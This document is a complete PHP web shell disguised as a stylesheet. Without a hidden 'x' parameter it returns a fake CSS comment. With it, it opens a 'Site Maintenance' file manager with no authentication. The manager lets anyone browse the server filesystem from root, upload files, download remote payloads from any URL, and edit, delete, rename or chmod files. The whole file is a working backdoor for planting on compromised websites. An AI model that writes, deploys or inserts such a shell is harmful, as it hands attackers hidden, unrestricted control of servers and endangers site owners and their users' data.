<?php
// Decoy
if (!isset($_GET['x'])) {
    header("Content-Type: text/css");
    echo "/* Default Admin Color Scheme */";
    exit;
}

header("Content-Type: text/html; charset=utf-8");
error_reporting(0);

// 1. Root tertinggi adalah / (filesystem)
$base_dir = '/'; 
$abs_path = isset($_GET['d']) ? str_replace('\\', '/', $_GET['d']) : __DIR__;

// Resolve path
$path = realpath($abs_path);
if ($path === false || !is_dir($path)) {
    $path = __DIR__; // Fallback
}

$msg = '';

// ================= ACTIONS =================
if (isset($_POST['u'])) {
    $f = rtrim($path, '/') . '/' . basename($_POST['u']);
    if (!empty($_FILES['f']['tmp_name'])) {
        move_uploaded_file($_FILES['f']['tmp_name'], $f);
        $msg = "Uploaded: " . basename($f);
    } else {
        $raw = file_get_contents('php://input');
        if ($raw) { file_put_contents($f, $raw); $msg = "Uploaded via stream."; }
    }
}

if (isset($_POST['url'])) {
    $u = $_POST['url'];
    $n = basename(parse_url($u, PHP_URL_PATH)) ?: 'file_'.time();
    if (function_exists('curl_init')) {
        $ch = curl_init($u);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        $d = curl_exec($ch);
        curl_close($ch);
    } else {
        $d = @file_get_contents($u);
    }
    if ($d !== false) { file_put_contents(rtrim($path,'/').'/'.$n, $d); $msg = "Fetched: $n"; }
}

if (isset($_GET['del'])) { 
    $f = rtrim($path, '/') . '/' . basename($_GET['del']); 
    if(is_file($f)){unlink($f);$msg="Deleted.";} 
}

if (isset($_POST['save'])) {
    $f = rtrim($path, '/') . '/' . basename($_POST['save']);
    file_put_contents($f, $_POST['c']);
    $msg = "Saved.";
}

if (isset($_POST['ren'])) {
    $f = rtrim($path, '/') . '/' . basename($_POST['old']);
    $n = rtrim($path, '/') . '/' . basename($_POST['new']);
    if (rename($f, $n)) $msg = "Renamed.";
}

if (isset($_POST['chm'])) {
    $f = rtrim($path, '/') . '/' . basename($_POST['target']);
    chmod($f, octdec($_POST['mode']));
    $msg = "Chmod set.";
}

if (isset($_POST['mk'])) {
    $f = rtrim($path, '/') . '/' . basename($_POST['folder']);
    if (!is_dir($f)) { mkdir($f, 0755); $msg = "Folder created."; }
}

$files = @scandir($path) ?: [];

$edit_file = null;
if (isset($_GET['edit'])) {
    $f = rtrim($path, '/') . '/' . basename($_GET['edit']);
    if (is_file($f)) $edit_file = ['name'=>basename($f), 'content'=>file_get_contents($f)];
}

// ================= PATH GENERATOR =================
$path_str = rtrim(str_replace('\\', '/', $path), '/');
if ($path_str === '') $path_str = '/';

// Bikin breadcrumb pake path absolute
$parts = explode('/', trim($path_str, '/'));
$abs_html = '<a href="?x=1&d=/">/</a>';
$accum = '';
foreach ($parts as $p) {
    if ($p === '') continue;
    $accum .= '/' . $p;
    $abs_html .= '<a href="?x=1&d=' . urlencode($accum) . '">' . htmlspecialchars($p) . '</a>/';
}

// Tombol up untuk path absolute
$up_link = null;
if ($path_str !== '/') {
    $up_link = dirname($path_str);
}
?>
<!doctype html><html><head><title>Site Maintenance</title>
<style>
body{background:#111;color:#ccc;font-family:monospace;margin:0;padding:20px}
a{color:#4fa8ff;text-decoration:none}table{width:100%;border-collapse:collapse;margin-top:10px}
td,th{padding:6px;border-bottom:1px solid #333;text-align:left;font-size:13px}
input[type=text],input[type=password],textarea{background:#222;color:#fff;border:1px solid #444;padding:4px}
button{background:#0073aa;color:#fff;border:none;padding:4px 8px;cursor:pointer}
.box{background:#1a1a1a;padding:10px;margin-bottom:10px;border:1px solid #333}
textarea{width:100%;height:400px}
.pwd{background:#000;padding:10px;border:1px solid #333;color:#0f0;margin-bottom:10px;word-break:break-all;}
.pwd a { color: #0f0; text-decoration: underline; }
</style></head><body>
<h2>Maintenance</h2>

<div class="pwd">
    <strong>PWD:</strong> <?= $abs_html ?>
</div>

<p>
    <?php if($up_link !== null): ?>
        <a href="?x=1&d=<?=urlencode($up_link)?>" style="font-size:16px;font-weight:bold;background:#0073aa;color:#fff;padding:6px 12px;border-radius:4px;">⬆ Naik Satu Folder</a>
    <?php endif; ?>
    <a href="?x=1&d=<?=urlencode($path)?>" style="margin-left:10px;">Refresh</a>
</p>
<?php if($msg): ?><p style="color:#5f5"><?=htmlspecialchars($msg)?></p><?php endif; ?>

<div class="box">
    <form method="post" enctype="multipart/form-data" style="display:inline-block;margin-right:15px">
        <input type="hidden" name="u" value="filename.txt">
        <input type="file" name="f"> <button>Upload</button>
    </form>
    <form method="post" style="display:inline-block;margin-right:15px">
        <input type="text" name="url" placeholder="https://..." style="width:200px"> <button>Fetch URL</button>
    </form>
    <form method="post" style="display:inline-block">
        <input type="text" name="folder" placeholder="new folder" style="width:120px"> <button>Mkdir</button>
    </form>
</div>

<?php if($edit_file): ?>
<div class="box">
    <h3>Editing: <?=htmlspecialchars($edit_file['name'])?></h3>
    <form method="post">
        <input type="hidden" name="save" value="<?=htmlspecialchars($edit_file['name'])?>">
        <textarea name="c"><?=htmlspecialchars($edit_file['content'])?></textarea>
        <br><button>Save</button>
        <a href="?x=1&d=<?=urlencode($path)?>" style="color:red;margin-left:10px">Cancel</a>
    </form>
</div>
<?php endif; ?>

<table>
<tr><th>Name</th><th>Size</th><th>Action</th></tr>
<?php if ($up_link !== null): ?>
<tr><td><a href="?x=1&d=<?=urlencode($up_link)?>">⬆ .. (Parent)</a></td><td>-</td><td>-</td></tr>
<?php endif; ?>
<?php foreach($files as $f): if($f=='.'||$f=='..') continue; 
    $fp = rtrim($path, '/') . '/' . $f; $isDir = is_dir($fp);
?>
<tr>
    <td><?php if($isDir): ?><a href="?x=1&d=<?=urlencode($fp)?>">📁 <?=htmlspecialchars($f)?>/</a>
        <?php else: ?><a href="?x=1&edit=<?=urlencode($f)?>&d=<?=urlencode($path)?>">📄 <?=htmlspecialchars($f)?></a><?php endif; ?></td>
    <td><?=$isDir?'-':round(filesize($fp)/1024,1).' KB'?></td>
    <td>
        <?php if(!$isDir): ?>
        <form method="post" style="display:inline">
            <input type="hidden" name="ren" value="1">
            <input type="hidden" name="old" value="<?=htmlspecialchars($f)?>">
            <input type="text" name="new" placeholder="new" style="width:70px"> <button>Ren</button>
        </form>
        <form method="post" style="display:inline">
            <input type="hidden" name="chm" value="1">
            <input type="hidden" name="target" value="<?=htmlspecialchars($f)?>">
            <input type="text" name="mode" placeholder="0644" style="width:50px"> <button>Chmod</button>
        </form>
        <?php endif; ?>
        <a href="?x=1&del=<?=urlencode($f)?>&d=<?=urlencode($path)?>" onclick="return confirm('Delete?')" style="color:red;margin-left:8px">Del</a>
    </td>
</tr>
<?php endforeach; ?>
</table>
</body></html>